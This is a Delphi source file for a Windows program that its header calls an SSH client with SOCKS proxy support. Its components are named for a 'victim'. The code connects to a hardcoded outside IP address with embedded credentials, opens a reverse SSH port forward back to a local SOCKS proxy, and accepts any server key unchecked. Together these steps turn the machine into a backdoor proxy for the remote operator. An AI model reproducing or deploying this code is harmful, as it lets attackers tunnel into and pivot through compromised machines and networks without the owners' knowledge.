{*******************************************************************************
* Unit: Unit1
* Purpose: SSH Client implementation with SOCKS proxy capabilities
* Author: Original code modified and documented
* Date: December 21, 2024
*******************************************************************************}
unit Unit1;

interface

{* Standard and component units *}
uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.StdCtrls, ScSSHClient, ScSSHChannel, ScBridge, ScSSHServer,
  Vcl.Samples.Spin, Vcl.ExtCtrls, ScUtils, ScSSHUtils,
  IdBaseComponent, IdComponent, IdCustomTCPServer, IdSocksServer;

type
  {* Main form class definition *}
  TForm1 = class(TForm)
    Memo1: TMemo;                        // Log display component
    Victimsshclient: TScSSHClient;       // SSH Client component
    VICTIMSSHCHANNEL: TScSSHChannel;     // SSH Channel for tunneling
    ScMemoryStorage1: TScMemoryStorage;   // Key storage component
    Button1: TButton;                     // Connection trigger
    IdSocksServer1: TIdSocksServer;      // SOCKS proxy server

    {* Event handlers *}
    procedure Button1Click(Sender: TObject);
    procedure VictimsshclientServerKeyValidate(Sender: TObject;
      NewServerKey: TScKey; var Accept: Boolean);
    procedure VICTIMSSHCHANNELConnect(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

{* Handles the connection button click event *}
procedure TForm1.Button1Click(Sender: TObject);
begin
  try
    {* Configure SSH client connection settings *}
    Victimsshclient.HostName := '167.224.235.47';
    Victimsshclient.Port := 3434;
    Victimsshclient.User := 'user';
    Victimsshclient.Password := 'pass';
    Victimsshclient.Connect;

    {* Configure SSH tunnel parameters *}
    VICTIMSSHCHANNEL.GatewayPorts := True;
    VICTIMSSHCHANNEL.Remote := True;     // Enable remote forwarding
    VICTIMSSHCHANNEL.Dynamic := False;
    VICTIMSSHCHANNEL.SourcePort := 5933;
    VICTIMSSHCHANNEL.DestHost := '127.0.0.1';
    VICTIMSSHCHANNEL.DestPort := 8888;   // Local proxy port
    VICTIMSSHCHANNEL.Connect;
  except
    on E: Exception do
      Memo1.Lines.Add('Error: ' + E.Message);
  end;
end;

{* Event handler for SSH channel connection *}
procedure TForm1.VICTIMSSHCHANNELConnect(Sender: TObject);
begin
  {* Initialize and activate SOCKS proxy server *}
  self.IdSocksServer1.DefaultPort := 8888;
  self.IdSocksServer1.Active := true;
end;

{* Handles SSH server key validation *}
procedure TForm1.VictimsshclientServerKeyValidate(Sender: TObject;
  NewServerKey: TScKey; var Accept: Boolean);
begin
  {* Auto-accept server certificate *}
  Accept := True;
end;

end.
